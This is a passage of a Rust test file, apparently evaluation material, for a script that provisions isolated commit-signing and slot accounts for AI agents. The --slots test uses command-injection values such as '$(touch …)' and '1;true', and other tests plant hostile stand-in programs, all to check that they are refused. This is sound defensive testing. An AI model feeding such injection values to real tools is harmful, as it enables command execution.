    }
}

/// 2.7.2 and anything newer passes preflight, compared as numbers (2.7.10 is
/// newer than 2.7.2, not older), and a dry run goes on to print its changes.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn preflight_accepts_openbao_2_7_2_and_later() {
    for v in ["2.7.2", "2.7.10", "2.8.0", "2.10.0", "3.0.0"] {
        let m = Machine::new();
        m.set("BAO_VERSION", v);
        let run = m.sitting(&["--dry-run"]);
        must_succeed(&run, &format!("OpenBao {v}"));
        assert!(
            run.stdout
                .lines()
                .any(|l| l.trim_start().starts_with("would:")),
            "OpenBao {v}: no would: lines"
        );
    }
}

/// D5, files: after the run the agents account's global git config no longer
/// sets `gpg.ssh.allowedSignersFile` (its other settings, including the
/// repeated credential helper, are untouched), `gpg.ssh.program` points at the
/// reviewed build, the managed block of certificate authorities is gone from
/// its `allowed_signers` (other lines kept, in order), its plain program
/// copies are links into `/opt/agent-sign/current` (the old `agent-signd` is
/// not linked back), root keeps copies of all of it for undo, and the work is
/// done as the agents account through sudo, never with a program from the
/// agents' own bin folder on the path, then checked. Decision D5.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn d5_the_agents_global_trust_and_managed_block_are_removed() {
    let m = Machine::new();
    let cfg_before = m.read("home/agents/.gitconfig").unwrap();
    let signers_before = m.read("home/agents/.config/git/allowed_signers").unwrap();
    let bins_before: Vec<(String, String)> = [
        "agent-git",
        "agent-sign",
        "agent-signd",
        "agent-ssh-sign",
        "git",
    ]
    .iter()
    .map(|n| {
        (
            n.to_string(),
            m.read(&format!("home/agents/.agent-sign/bin/{n}")).unwrap(),
        )
    })
    .collect();
    let run = m.sitting(&[]);
    must_succeed(&run, "the run");

    let cfg = m.path("home/agents/.gitconfig");
    assert_eq!(
        git_get(&cfg, "gpg.ssh.allowedSignersFile"),
        None,
        "the agents' global allowedSignersFile must be removed"
    );
    assert_eq!(
        git_get(&cfg, "gpg.ssh.program").as_deref(),
        Some(AGENT_PROGRAM)
    );
    assert_eq!(
        git_get(&cfg, "user.name").as_deref(),
        Some("work-loop agent on hetzner")
    );
    assert_eq!(
        git_get(&cfg, "user.email").as_deref(),
        Some("agents@hetzner.invalid")
    );
    assert_eq!(
        git_get(&cfg, "credential.https://github.com.username").as_deref(),
        Some("taylor-made-labs-agents")
    );
    assert_eq!(
        git_get_all(&cfg, "credential.https://github.com.helper").len(),
        2,
        "the agents' other settings must stay untouched\n{cfg_before}"
    );

    let signers = m
        .read("home/agents/.config/git/allowed_signers")
        .expect("the file stays, minus the block");
    assert!(
        !signers.contains(BLOCK_BEGIN) && !signers.contains(BLOCK_END),
        "the managed block's marks remain"
    );
    assert!(
        !signers.contains("cert-authority"),
        "a certificate authority of the old block remains"
    );
    assert_eq!(
        lines_of(&signers),
        without_block(&signers_before),
        "lines outside the block must be kept, in order"
    );

    for n in ["agent-git", "agent-sign", "agent-ssh-sign"] {
        assert_eq!(
            m.link(&format!("home/agents/.agent-sign/bin/{n}"))
                .as_deref(),
            Some(format!("/opt/agent-sign/current/bin/{n}").as_str()),
            "{n} must be a link into /opt/agent-sign/current/bin"
        );
    }
    assert_eq!(
        m.link("home/agents/.agent-sign/bin/git").as_deref(),
        Some("/opt/agent-sign/current/wrap/git"),
        "the agents' git must be the reviewed wrapper"
    );
    assert!(
        m.link("home/agents/.agent-sign/bin/agent-signd").as_deref()
            != Some("/opt/agent-sign/current/bin/agent-signd"),
        "the old agent-signd copy must not be linked back"
    );
    for e in fs::read_dir(m.path("home/agents/.agent-sign/bin"))
        .unwrap()
        .flatten()
    {
        assert!(
            fs::symlink_metadata(e.path())
                .unwrap()
                .file_type()
                .is_symlink(),
            "a plain copy remains in the agents' bin folder: {}",
            e.path().display()
        );
    }

    // Root's copies, for undo.
    let saved: Vec<(PathBuf, Vec<u8>)> = m
        .all_files()
        .into_iter()
        .filter(|(p, _)| p.starts_with(m.path("var/lib/agent-sign-sitting/before")))
        .collect();
    let has = |text: &str| saved.iter().any(|(_, b)| b == text.as_bytes());
    assert!(
        has(&cfg_before),
        "no saved copy of the agents' git config under var/lib/agent-sign-sitting/before/"
    );
    assert!(
        has(&signers_before),
        "no saved copy of the agents' allowed_signers"
    );
    for (n, c) in &bins_before {
        assert!(has(c), "no saved copy of the agents' old {n}");
    }
    for (p, _) in &saved {
        assert_eq!(
            fs::metadata(p).unwrap().permissions().mode() & 0o022,
            0,
            "{} must not be group or world writable",
            p.display()
        );
    }

    // Done as the agents account, then checked.
    assert!(
        m.sudo_log()
            .iter()
            .any(|(u, _, c)| u == "agents" && c.contains("git")),
        "D5 must act through sudo -u agents: {:?}",
        m.sudo_log()
    );
    assert!(
        !m.top.join("hostile-ran").exists(),
        "the script ran a program from the agents' own bin folder, as root's helper"
    );
    let calls = m.calls();
    let unset = calls
        .iter()
        .find(|c| {
            c.name == "git" && c.args.contains("--unset") && c.args.contains("allowedSignersFile")
        })
        .expect("a git config --unset of allowedSignersFile");
    let check = calls
        .iter()
        .find(|c| {
            c.name == "git"
                && c.args.contains("--show-origin")
                && c.args.contains("allowedSignersFile")
        })
        .expect("a git config --show-origin check of allowedSignersFile after the removal");
    assert!(
        check.seq > unset.seq,
        "the check must come after the removal"
    );
    let checks = check_lines(&run);
    assert!(
        checks
            .iter()
            .any(|(t, n)| t == "PASS" && n.contains("allowed_signers")),
        "no PASS line about allowed_signers\n{}",
        run.stdout
    );
}

/// D5, service: the user-level `agent-signd` of the agents account is stopped
/// and disabled (and masked, so nothing starts it again), by stand-in calls
/// made as `systemctl --user -M agents@`, only after the new system service
/// has been started and has answered, and then checked with a read call. The
/// stand-in state shows it off. Decision D5; design section 6, items 5 and
/// the order in "How a failed run is undone".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn d5_the_old_user_service_is_stopped_disabled_and_masked_after_the_new_one_runs() {
    let m = Machine::new();
    let run = m.sitting(&[]);
    must_succeed(&run, "the run");
    let u = m.unit("user", "agent-signd.service");
    assert!(!u.active, "the user-level agent-signd is still running");
    assert!(!u.enabled, "the user-level agent-signd is still enabled");
    assert!(
        u.masked,
        "the user-level agent-signd should be masked so nothing restarts it"
    );
    let s = m.unit("system", "agent-signd.service");
    assert!(
        s.active && s.enabled,
        "the system agent-signd must be enabled and running"
    );

    let calls = m.calls();
    let user_calls: Vec<&Call> = calls
        .iter()
        .filter(|c| {
            c.name == "systemctl"
                && c.args.starts_with("user ")
                && c.args.contains("agent-signd.service")
        })
        .collect();
    let stop = user_calls
        .iter()
        .find(|c| {
            c.args.contains(" stop ") || (c.args.contains(" disable ") && c.args.contains("--now"))
        })
        .expect("a stand-in call stopping the user-level agent-signd");
    assert!(
        user_calls.iter().any(|c| c.args.contains(" disable ")),
        "no call disabling the user-level agent-signd: {user_calls:?}"
    );
    assert!(
        user_calls.iter().any(|c| c.args.contains(" mask ")),
        "no call masking the user-level agent-signd: {user_calls:?}"
    );
    assert!(
        user_calls.iter().any(|c| c.seq > stop.seq
            && (c.args.contains(" is-active") || c.args.contains(" is-enabled"))),
        "the stop must be checked afterwards (is-active or is-enabled): {user_calls:?}"
    );
    let started = calls
        .iter()
        .find(|c| {
            c.name == "systemctl"
                && c.args.starts_with("system ")
                && c.args.contains("agent-signd.service")
                && (c.args.contains(" start ")
                    || c.args.contains(" restart ")
                    || (c.args.contains(" enable ") && c.args.contains("--now")))
        })
        .expect("a call starting the system agent-signd");
    assert!(
        stop.seq > started.seq,
        "the old service must be stopped only after the new one is started"
    );
    assert!(
        calls.iter().any(|c| c.name == "program"
            && c.args.contains("bin/agent-sign ")
            && c.seq > started.seq
            && c.seq < stop.seq),
        "the new service must have answered a health check (the installed agent-sign program) before the old one is stopped: {calls:?}"
    );
    assert!(
        check_lines(&run)
            .iter()
            .any(|(t, n)| t == "PASS" && n.contains("agent-signd")),
        "no PASS line about agent-signd\n{}",
        run.stdout
    );
}

/// D5 is checked, not assumed: if the git config removal does nothing (the
/// stand-in says it worked but changes nothing), or the user service is not
/// really stopped (the stand-in says it worked but nothing changes), the run
/// ends non-zero and its output names `allowedSignersFile` / `agent-signd`;
/// it does not report success. Decision D5: "Then, as agents, it checks ...".
///
/// Fails today: the script doesn't exist (exit 127; nothing is named).
#[test]
fn d5_removals_are_checked_not_assumed() {
    let m = Machine::new();
    m.set("LIE_GIT_UNSET", "1");
    let run = m.sitting(&[]);
    assert_ne!(
        run.code,
        0,
        "the removal did nothing, but the run says it worked\n{}",
        run.text()
    );
    let t = run.text().to_lowercase();
    assert!(
        t.contains("allowedsignersfile") || t.contains("allowed_signers"),
        "the failure should name the trust setting that is still there\n{}",
        run.text()
    );
    assert!(!run.text().contains("All checks passed"));

    let m = Machine::new();
    m.set("LIE_USER_UNIT", "1");
    let run = m.sitting(&[]);
    assert_ne!(
        run.code,
        0,
        "the old service is still running, but the run says it worked\n{}",
        run.text()
    );
    assert!(
        run.text().contains("agent-signd"),
        "the failure should name the service that is still running\n{}",
        run.text()
    );
}

/// The trust file is root's, `/etc/agent-sign/allowed_signers`: exactly one
/// line that is not blank or a comment, `*@hetzner.agents.local
/// cert-authority,namespaces="git" <OpenBao's CA public key>`, mode 0644; the
/// system `gitconfig` sets `gpg.ssh.allowedSignersFile` to it; and, as the
/// agents account sees git (global config then system), the effective file is
/// that one, from `/etc/gitconfig`. Design sections 1 and 6.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn the_trust_file_has_exactly_the_openbao_ca_line_and_git_points_at_it() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let trust = m
        .read("etc/agent-sign/allowed_signers")
        .expect("the trust file");
    let real: Vec<&str> = trust
        .lines()
        .filter(|l| !l.trim().is_empty() && !l.trim_start().starts_with('#'))
        .collect();
    assert_eq!(
        real,
        vec![
            format!(
                "*@{MACHINE}.agents.local cert-authority,namespaces=\"git\" {}",
                m.ca_key
            )
            .as_str()
        ],
        "exactly one line, OpenBao's CA, for this machine's agents"
    );
    assert_eq!(m.mode("etc/agent-sign/allowed_signers"), 0o644);
    assert_eq!(m.owner("etc/agent-sign/allowed_signers"), "root:root");
    assert_eq!(
        git_get(&m.path("etc/gitconfig"), "gpg.ssh.allowedSignersFile").as_deref(),
        Some(TRUST_PATH)
    );
    assert_eq!(m.mode("etc/gitconfig") & 0o022, 0);
    let out = Command::new("/usr/bin/git")
        .args([
            "config",
            "--show-origin",
            "--get",
            "gpg.ssh.allowedSignersFile",
        ])
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("HOME", m.path("home/agents"))
        .env("GIT_CONFIG_GLOBAL", m.path("home/agents/.gitconfig"))
        .env("GIT_CONFIG_SYSTEM", m.path("etc/gitconfig"))
        .output()
        .unwrap();
    let seen = String::from_utf8_lossy(&out.stdout).to_string();
    assert!(
        seen.starts_with("file:")
            && seen.contains("/etc/gitconfig")
            && seen.trim_end().ends_with(TRUST_PATH),
        "the agents' git sees only the system file: {seen:?}"
    );
}

/// `--slots N` sets the number of slot accounts (default 8, not hard-coded):
/// accounts `agent-slot-1..N`, each with its own group, `agent-launch` in each
/// group (and nobody else), every slot in `/etc/at.deny` (existing lines kept)
/// and in a `/etc/cron.deny` holding only slots, and the setting in
/// `system.toml`. Raising N on a rerun adds accounts; lowering it never
/// deletes an account or its Trash. Design: section 1 (Accounts) and the
/// "slots" setting; D6.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn slots_sets_the_accounts_the_deny_lists_and_the_setting_and_lowering_deletes_nothing() {
    let m = Machine::new();
    must_succeed(&m.sitting(&["--slots", "3"]), "run with 3 slots");
    for a in slot_accounts(3) {
        let p = m.passwd(&a).unwrap_or_else(|| panic!("{a} should exist"));
        assert!(
            p[2].parse::<u32>().unwrap() < 1000,
            "{a} must be a system account"
        );
        assert_eq!(p[6], "/usr/sbin/nologin", "{a} must have no shell");
        let members = m
            .group_members(&a)
            .unwrap_or_else(|| panic!("group {a} should exist"));
        assert_eq!(
            members,
            vec!["agent-launch".to_string()],
            "only agent-launch is in {a}'s group"
        );
    }
    assert!(
        m.passwd("agent-slot-4").is_none(),
        "only 3 slot accounts were asked for"
    );
    let toml: toml::Value = m
        .read("etc/agent-sign/system.toml")
        .unwrap()
        .parse()
        .unwrap();
    assert_eq!(toml["slots"]["count"].as_integer(), Some(3));

    // Raise to 5.
    must_succeed(&m.sitting(&["--slots", "5"]), "run again with 5 slots");
    for a in slot_accounts(5) {
        assert!(
            m.passwd(&a).is_some(),
            "{a} should exist after raising the count"
        );
    }
    let at: Vec<String> = lines_of(&m.read("etc/at.deny").unwrap());
    assert!(
        at.contains(&"daemon".to_string()) && at.contains(&"bin".to_string()),
        "existing at.deny lines must stay: {at:?}"
    );
    for a in slot_accounts(5) {
        assert_eq!(
            at.iter().filter(|l| **l == a).count(),
            1,
            "{a} once in at.deny: {at:?}"
        );
    }
    let mut cron = lines_of(
        &m.read("etc/cron.deny")
            .expect("etc/cron.deny holding the slot accounts"),
    );
    cron.sort();
    let mut want = slot_accounts(5);
    want.sort();
    assert_eq!(
        cron, want,
        "cron.deny holds only the slot accounts, once each"
    );
    let toml: toml::Value = m
        .read("etc/agent-sign/system.toml")
        .unwrap()
        .parse()
        .unwrap();
    assert_eq!(toml["slots"]["count"].as_integer(), Some(5));

    // Lower to 2: nothing is deleted.
    m.put(
        "var/lib/agent-slots/5/trash/20261101-bbbbbbbb/work/x.txt",
        "keep\n",
        0o600,
    );
    let before_lower = m.read("etc/passwd").unwrap();
    must_succeed(&m.sitting(&["--slots", "2"]), "run again with 2 slots");
    for a in slot_accounts(5) {
        assert!(
            m.passwd(&a).is_some(),
            "lowering the count must not delete {a}"
        );
    }
    assert!(
        lines_of(&before_lower).iter().all(|l| m
            .read("etc/passwd")
            .unwrap()
            .lines()
            .any(|x| x == l))
    );
    assert_eq!(
        m.read("var/lib/agent-slots/5/trash/20261101-bbbbbbbb/work/x.txt")
            .as_deref(),
        Some("keep\n"),
        "a Trash must survive"
    );
    assert!(m.mutations().iter().all(|l| !l.starts_with("FORBIDDEN-")));
    let toml: toml::Value = m
        .read("etc/agent-sign/system.toml")
        .unwrap()
        .parse()
        .unwrap();
    assert_eq!(toml["slots"]["count"].as_integer(), Some(2));
}

/// `--slots` must be a plain positive whole number: anything else stops the
/// run before any change, with a plain message, because the number is written
/// into a polkit rule (JavaScript run as root's decision-maker). A value
/// built to inject code never runs and never reaches a file.
///
/// Fails today: the script doesn't exist (exit 127; no `Stopped:` line).
#[test]
fn a_slots_value_that_is_not_a_plain_positive_number_is_refused_before_any_change() {
    for bad in [
        "0",
        "abc",
        "-1",
        "2.5",
        "",
        "1;true",
        "8) || true; (1",
        "1 2",
        "0x10",
        "+3",
    ] {
        let m = Machine::new();
        let before = m.snap();
        let run = m.sitting(&["--slots", bad]);
        must_stop_plainly(
            &run,
            &format!("--slots {bad:?}"),
            &["slots", "number", "count"],
        );
        let d = diff(&before, &m.snap());
        assert!(d.is_empty(), "--slots {bad:?}: the machine changed: {d:?}");
        assert!(
            m.mutations().is_empty(),
            "--slots {bad:?}: changes were made"
        );
    }
    for form in ["$(touch {P})", "`touch {P}`"] {
        let m = Machine::new();
        let marker = m.top.join("pwned");
        let bad = form.replace("{P}", &marker.to_string_lossy());
        let run = m.sitting(&["--slots", &bad]);
        must_stop_plainly(
            &run,
            "--slots with a command in it",
            &["slots", "number", "count"],
        );
        assert!(!marker.exists(), "the --slots value was executed");
        assert!(m.mutations().is_empty());
    }
}

/// Other preflight failures stop before any change, each with a plain message
/// naming the cause: the source isn't the named commit; `AGENT_SIGN_SOCKET`
/// set in the agents' login files; an existing `system.toml` for another
/// machine; an account name already taken by a person's login; OpenBao's CA
/// not one ed25519 key (an RSA key, or two keys); no login delivered; OpenBao
/// sealed; the source file missing; run as root; run as the agents account.
/// Design section 8, "Before any change (read-only)".
///
/// Fails today: the script doesn't exist (exit 127; no `Stopped:` line).
#[test]
fn other_preflight_failures_stop_before_any_change() {
    type Setup = fn(&Machine);
    type Case = (
        &'static str,
        Setup,
        Option<&'static str>,
        &'static [&'static str],
    );
    let cases: Vec<Case> = vec![
        (
            "the source is another commit",
            |_m| {},
            Some("0000000000000000000000000000000000000000"),
            &["commit"],
        ),
        (
            "AGENT_SIGN_SOCKET in the agents' login file",
            |m| {
                m.put("home/agents/.bashrc", "export PATH=\"$HOME/.agent-sign/bin:$PATH\"\nexport AGENT_SIGN_SOCKET=/home/agents/.agent-sign/daemon.sock\n", 0o644);
            },
            None,
            &["AGENT_SIGN_SOCKET"],
        ),
        (
            "a system.toml for another machine",
            |m| {
                m.put(
                    "etc/agent-sign/system.toml",
                    "machine = \"pi\"\n[service]\naccount = \"someone-else\"\n",
                    0o644,
                );
            },
            None,
            &["system.toml"],
        ),
        (
            "agent-sign is a person's login",
            |m| {
                let p = m.read("etc/passwd").unwrap();
                m.put(
                    "etc/passwd",
                    &format!("{p}agent-sign:x:1005:1005::/home/agent-sign:/bin/bash\n"),
                    0o644,
                );
            },
            None,
            &["agent-sign"],
        ),
        (
            "the CA is an RSA key",
            |m| {
                m.set("CA_RAW", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7stubstubstubstubstubstubstubstubstubstub");
            },
            None,
            &["public_key", "ed25519", "ca"],
        ),
        (
            "OpenBao answers two keys",
            |m| {
                let two = format!("{}\n{}", m.ca_key, random_public_key());
                m.set("CA_RAW", &two);
            },
            None,
            &["public_key", "ed25519", "one", "ca"],
        ),
        (
            "no login delivered",
            |m| {
                let _ = fs::remove_file(
                    m.path("home/admin/.config/credstore.encrypted/openbao-agent-sign-hetzner"),
                );
            },
            None,
            &["login"],
        ),
        (
            "OpenBao is sealed",
            |m| m.set("BAO_SEALED", "1"),
            None,
            &["sealed", "unseal", "openbao"],
        ),
        ("the source file is missing", |_m| {}, None, &["source"]),
        ("run as root", |m| m.set("ME", "root"), None, &["root"]),
        (
            "run as the agents account",
            |m| m.set("ME", "agents"),
            None,
            &["agents"],
        ),
    ];
    for (name, setup, commit, words) in cases {
        let m = Machine::new();
        setup(&m);
        let before = m.snap();
        let source = if name.contains("source file is missing") {
            m.top
                .join("no-such-source.tar")
                .to_string_lossy()
                .to_string()
        } else {
            m.source.to_string_lossy().to_string()
        };
        let commit = commit.map(String::from).unwrap_or_else(|| m.commit.clone());
        let run = m.run_with(
            &[
                "--machine",
                MACHINE,
                "--commit",
                &commit,
                "--source",
                &source,
            ],
            PREFIX,
            &[],
        );
        must_stop_plainly(&run, name, words);
        let d = diff(&before, &m.snap());
        assert!(
            d.is_empty(),
            "{name}: the machine changed before preflight stopped: {d:?}"
        );
        assert!(
            m.mutations().is_empty(),
            "{name}: changes were made: {:?}",
            m.mutations()
        );
    }
}

/// A build that contains a test stand-in is refused by
/// `scripts/check-binary-clean.sh` before anything is installed: no program
/// under `/opt/agent-sign`, no `current` link, no account, no unit. Design
/// step 1: "after `scripts/check-binary-clean.sh` confirms no test hooks are
/// in them".
///
/// Fails today: the script doesn't exist (exit 127; no `Stopped:` line).
#[test]
fn a_test_build_is_refused_and_nothing_is_installed() {
    // DELIBERATE EVAL CHANGE (I-A3): the source's own scripts/check-binary-clean.sh is now a
    // hostile stand-in that approves any build (see make_source). The assertions are unchanged:
    // the build must still be refused, which only the sitting's own reviewed copy can do.
    let m = Machine::new();
    m.make_build(true);
    let before = m.snap();
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "a build with a test hook",
        &["test", "stand-in", "check-binary-clean", "refus"],
    );
    assert!(
        !m.exists("opt/agent-sign/current"),
        "current must not point at a refused build"
    );
    assert!(
        !m.exists(&format!("opt/agent-sign/{}/bin/agent-signd", m.commit)),
        "a refused program was installed"
    );
    assert!(
        m.passwd("agent-sign").is_none(),
        "an account was made after the build was refused"
    );
    let d = diff(&before, &m.snap());
    assert!(
        d.iter().all(|l| l.contains("opt/agent-sign")),
        "only a leftover under opt/agent-sign is tolerated after a refused build: {d:?}"
    );
}

/// The programs are installed root-owned under `/opt/agent-sign/<commit>/`,
/// executable, not writable by group or others, with their SHA-256 in
/// `SHA256SUMS`; `wrap/git` links to `../bin/agent-git`; `/opt/agent-sign/current`
/// links to `<commit>`; and the throwaway build ran once, offline from root's
/// view (a `systemd-run --wait --pipe` with a dynamic user), never as a
/// root-run build. Design section 8, step 1 and "Building the programs".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn the_programs_are_installed_root_owned_with_their_hashes_and_current_points_at_them() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let base = format!("opt/agent-sign/{}", m.commit);
    let sums = m
        .read(&format!("{base}/SHA256SUMS"))
        .expect("SHA256SUMS next to the programs");
    for name in PROGRAMS {
        let rel = format!("{base}/bin/{name}");
        let content = m
            .read(&rel)
            .unwrap_or_else(|| panic!("{rel} should be installed"));
        assert_eq!(
            content,
            fake_program(&m.log, name, false),
            "{rel} is not the build's program"
        );
        let mode = m.mode(&rel);
        assert!(mode & 0o111 != 0, "{rel} must be executable");
        assert_eq!(mode & 0o022, 0, "{rel} must not be group or world writable");
        assert_eq!(m.owner(&rel), "root:root", "{rel} must be root's");
        let h = sha_hex(content.as_bytes());
        assert!(
            sums.lines()
                .any(|l| l.starts_with(&h) && l.trim_end().ends_with(name)),
            "SHA256SUMS lacks the hash of {name}: {sums}"
        );
    }
    assert_eq!(
        m.link(&format!("{base}/wrap/git")).as_deref(),
        Some("../bin/agent-git")
    );
    assert_eq!(
        m.link("opt/agent-sign/current").as_deref(),
        Some(m.commit.as_str())
    );
    let builds: Vec<Call> = m
        .calls()
        .into_iter()
        .filter(|c| c.name == "systemd-run")
        .collect();
    // DELIBERATE EVAL CHANGE (A-4): the build is two throwaway runs, not one: a fetch
    // phase (network, with the local and private ranges denied) and a compile phase (no
    // network). One systemd-run call cannot give the compile a closed network.
    assert_eq!(
        builds.len(),
        2,
        "two throwaway runs, fetch then compile: {builds:?}"
    );
    for b in &builds {
        assert!(
            b.args.contains("DynamicUser=yes"),
            "the build must run as a throwaway account: {}",
            b.args
        );
        assert!(
            b.args.contains("--pipe") && b.args.contains("--wait"),
            "{}",
            b.args
        );
    }
    assert!(
        m.sudo_log()
            .iter()
            .all(|(u, _, c)| !(c.contains("cargo") || c.contains("rustc")) || u != "root"),
        "root must never run the compiler: {:?}",
        m.sudo_log()
    );
}

fn unit_text(m: &Machine, name: &str) -> String {
    m.read(&format!("etc/systemd/system/{name}"))
        .unwrap_or_else(|| panic!("{name} should be installed"))
}

/// The units are installed as designed: the service and launcher run as their
/// own accounts; the session and end-of-session templates run as
/// `agent-slot-%i`, are never enabled (no `[Install]`), the session cannot
/// gain privilege and is killed with its control group, the end step has no
/// network; no unit runs as root; the sockets have the designed modes and
/// owners; the services and sockets are enabled and running, the templates
/// are not. Design sections 1 and 2.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn the_session_units_run_as_the_slot_accounts_and_are_never_enabled() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let svc = unit_text(&m, "agent-signd.service");
    assert!(svc.contains("User=agent-sign"), "{svc}");
    let launcher = unit_text(&m, "agent-launchd.service");
    assert!(launcher.contains("User=agent-launch"), "{launcher}");
    let session = unit_text(&m, "agent-session@.service");
    assert!(session.contains("User=agent-slot-%i"), "{session}");
    assert!(session.contains("NoNewPrivileges=yes"), "{session}");
    assert!(session.contains("KillMode=control-group"), "{session}");
    assert!(session.contains("UMask=0077"), "{session}");
    assert!(
        !session.contains("[Install]"),
        "a session template is never enabled"
    );
    let end = unit_text(&m, "agent-session-end@.service");
    assert!(end.contains("User=agent-slot-%i"), "{end}");
    assert!(
        end.contains("PrivateNetwork=yes"),
        "the end check has no network: {end}"
    );
    assert!(!end.contains("[Install]"));
    for u in [
        "agent-signd.socket",
        "agent-signd-launcher.socket",
        "agent-signd.service",
        "agent-launchd.socket",
        "agent-launchd.service",
        "agent-session@.service",
        "agent-session-end@.service",
    ] {
        let t = unit_text(&m, u);
        assert!(
            !t.lines()
                .any(|l| l.trim() == "User=root" || l.trim() == "User=" || l.trim() == "User=0"),
            "{u} must not run as root"
        );
        assert_eq!(
            m.mode(&format!("etc/systemd/system/{u}")) & 0o022,
            0,
            "{u} must not be group or world writable"
        );
    }
    let public = unit_text(&m, "agent-signd.socket");
    assert!(
        public.contains("ListenStream=/run/agent-sign/daemon.sock")
            && public.contains("SocketMode=0666"),
        "{public}"
    );
    let only = unit_text(&m, "agent-signd-launcher.socket");
    assert!(
        only.contains("ListenStream=/run/agent-sign/launcher.sock")
            && only.contains("SocketMode=0660"),
        "{only}"
    );
    assert!(
        only.contains("SocketUser=agent-sign") && only.contains("SocketGroup=agent-launch"),
        "{only}"
    );
    let launch = unit_text(&m, "agent-launchd.socket");
    assert!(
        launch.contains("ListenStream=/run/agent-launch/launch.sock")
            && launch.contains("SocketMode=0666"),
        "{launch}"
    );
    for u in [
        "agent-signd.socket",
        "agent-signd-launcher.socket",
        "agent-signd.service",
        "agent-launchd.socket",
        "agent-launchd.service",
    ] {
        let s = m.unit("system", u);
        assert!(s.enabled && s.active, "{u} must be enabled and running");
    }
    let started: Vec<String> = fs::read_dir(m.state.join("system"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .filter(|n| {
            n.starts_with("agent-session") && (n.ends_with(".active") || n.ends_with(".enabled"))
        })
        .collect();
    assert!(
        started.is_empty(),
        "the session templates are only ever started by the launcher: {started:?}"
    );
}

/// `system.toml` says this machine and its accounts as designed (parsed, not
/// grepped), holds no secret, is root's and world-readable but not writable.
/// Design section 1, "The settings file".
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn system_toml_names_this_machine_and_the_accounts_and_holds_no_secret() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let text = m.read("etc/agent-sign/system.toml").expect("system.toml");
    let t: toml::Value = text
        .parse()
        .unwrap_or_else(|e| panic!("system.toml must parse: {e}\n{text}"));
    assert_eq!(t["machine"].as_str(), Some(MACHINE));
    assert_eq!(t["service"]["account"].as_str(), Some("agent-sign"));
    assert_eq!(t["service"]["trust_file"].as_str(), Some(TRUST_PATH));
    assert_eq!(
        t["service"]["socket"].as_str(),
        Some("/run/agent-sign/daemon.sock")
    );
    assert_eq!(
        t["service"]["launcher_socket"].as_str(),
        Some("/run/agent-sign/launcher.sock")
    );
    let clients: Vec<&str> = t["service"]["client_accounts"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    assert!(
        clients.contains(&"agents"),
        "the agents account is a client: {clients:?}"
    );
    assert_eq!(t["launcher"]["account"].as_str(), Some("agent-launch"));
    assert_eq!(
        t["launcher"]["socket"].as_str(),
        Some("/run/agent-launch/launch.sock")
    );
    assert_eq!(
        t["slots"]["count"].as_integer(),
        Some(8),
        "the default is 8 slots"
    );
    assert_eq!(t["slots"]["account_prefix"].as_str(), Some("agent-slot-"));
    assert_eq!(t["slots"]["root"].as_str(), Some("/var/lib/agent-slots"));
    assert_eq!(t["authority"]["issuer"].as_str(), Some("openbao"));
    assert_eq!(t["authority"]["mount"].as_str(), Some("ssh-agents-hetzner"));
    assert_eq!(t["authority"]["role"].as_str(), Some("agent-sign-hetzner"));
    let low = text.to_lowercase();
    for word in ["secret", "token", "password", "role_id", SECRET_ID] {
        assert!(
            !low.contains(&word.to_lowercase()),
            "system.toml mentions {word}: no secrets belong in it"
        );
    }
    assert_eq!(m.mode("etc/agent-sign/system.toml"), 0o644);
    assert_eq!(m.owner("etc/agent-sign/system.toml"), "root:root");
}

/// Accounts and folders as designed (default 8 slots): `agent-sign` and
/// `agent-launch` and `agent-slot-1..8` are system accounts with no shell,
/// the right homes for the first two, nobody else (not `agents`, not Taylor)
/// in any new group; the slots' folders have the designed owners and modes
/// (`/var/lib/agent-slots` root 0755; each slot folder `agent-launch` with
/// the slot's group, 0750; each Trash `agent-launch` 0700; the launcher's
/// state `agent-launch` 0700 with `specs`, `logs` and `out`); and the
/// accounts that existed are unchanged. D6 and design section 1.
///
/// Fails today: the script doesn't exist (exit 127 instead of 0).
#[test]
fn accounts_and_folders_are_made_as_designed() {
    let m = Machine::new();
    let before = lines_of(&m.read("etc/passwd").unwrap());
    must_succeed(&m.sitting(&[]), "the run");
    let after = lines_of(&m.read("etc/passwd").unwrap());
    assert!(
        before.iter().all(|l| after.contains(l)),
        "an existing account changed"
    );
    for (name, home) in [
        ("agent-sign", "/var/lib/agent-sign"),
        ("agent-launch", "/var/lib/agent-launch"),
    ] {
        let p = m
            .passwd(name)
            .unwrap_or_else(|| panic!("{name} should exist"));
        assert!(
            p[2].parse::<u32>().unwrap() < 1000,
            "{name} must be a system account"
        );
        assert_eq!(p[5], home);
        assert_eq!(p[6], "/usr/sbin/nologin");
    }
    for a in slot_accounts(8) {
        let p = m.passwd(&a).unwrap_or_else(|| panic!("{a} should exist"));
        assert!(p[2].parse::<u32>().unwrap() < 1000);
        assert_eq!(p[6], "/usr/sbin/nologin");
    }
    assert!(m.passwd("agent-slot-9").is_none(), "the default is 8 slots");
    let mut groups: Vec<String> = slot_accounts(8);
    groups.extend(["agent-sign".to_string(), "agent-launch".to_string()]);
    for g in &groups {
        let members = m.group_members(g).unwrap_or_else(|| panic!("group {g}"));
        assert!(
            !members.contains(&"agents".to_string()) && !members.contains(&"taylor".to_string()),
            "{g} has a person's or the agents' account: {members:?}"
        );
    }
    for a in slot_accounts(8) {
        assert!(
            m.group_members(&a)
                .unwrap()
                .contains(&"agent-launch".to_string()),
            "agent-launch must be in {a}'s group"
        );
    }
    assert_eq!(
        (
            m.mode("var/lib/agent-slots"),
            m.owner("var/lib/agent-slots").as_str()
